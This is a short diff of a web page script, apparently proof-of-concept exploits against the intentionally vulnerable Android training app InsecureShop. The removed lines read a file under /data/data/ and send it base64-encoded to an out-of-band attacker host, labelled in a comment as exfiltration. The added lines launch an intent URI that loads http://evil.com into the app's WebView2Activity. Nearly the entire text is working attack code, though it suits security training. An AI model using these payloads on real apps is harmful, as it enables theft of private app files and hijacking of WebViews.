@@ -1,14 +1,4 @@
 <script>
-    var url = 'file:///data/data/'; //local file
-function load(url) {
-        var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-            fetch('https://cfh61hy2vtc0000mtzwgg8auy3yyyyyyb.oast.fun/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
-            }
-        }
-xhr.open('GET', url, true);
-        xhr.send('');
-    }
-load(url)
+location.href = "intent:#Intent;S.url=http://evil.com;c
+omponent=com.insecureshop/com.insecureshop.WebView2Activity;end";
 </script>
